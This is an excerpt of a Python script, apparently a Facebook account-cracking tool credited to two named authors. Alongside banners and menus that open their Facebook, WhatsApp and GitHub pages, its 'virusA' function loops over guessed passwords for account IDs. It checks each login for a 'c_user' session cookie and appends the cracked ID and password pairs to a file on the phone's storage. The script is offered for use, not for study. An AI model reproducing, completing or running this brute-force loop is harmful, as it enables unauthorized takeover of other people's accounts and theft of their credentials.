...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; FARHAN x JOBAID \x07')
...
\x1b[38;5;46m______________________________________________________
 \033[1;31m[\033[1;32m[P]\033[1;31m]\033[1;32m [+] AUTHOR : MD FARHAN
 \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m [+] AUTHOR : MD JOBAID
 \033[1;31m[\033[1;32m[S]\033[1;31m]\033[1;32m [+] FACEBOOK  : MD FARHAN
 \033[1;31m[\033[1;32m[S]\033[1;31m]\033[1;32m [+] FACEBOOK  : MOHAMMAD JOBAID
 \033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m [+] GITHUB    : PYSCO-XD
 \033[1;31m[\033[1;32m[X]\033[1;31m]\033[1;32m [+] TOOLS     : RENDOM
 \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m [+] VERSION   : \033[1;31m[V-0.1]
...
def Main():
	...
	print("[\033[1;37m02]\33[1;92mCONTACT WHAT'SAPP")
	print("[\033[1;37m03]\33[1;92mFOLLOW MY FB PROFILE")
	print("[\033[1;37m04]\33[1;92mFOLLOW MY 2ND FB PROFILE")
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/bcsz.army.1.0.2');time.sleep(1)
		os.system('xdg-open https://www.facebook.com/Jobaid.Nam.Toh.Sunso.E');time.sleep(2)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801843961233');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/PYSCO-XD2/R4ND9M');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	print(' ┏━[•] EXAMPLE : 3000,5000,10000,15000,20000] ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [PYSCO-XD] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/PYSCO-XD-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    if id in DARK:
        ...
        os.system("xdg-open https://www.facebook.com/bcsz.army.1.0.2")
        superuser()        
superuser()
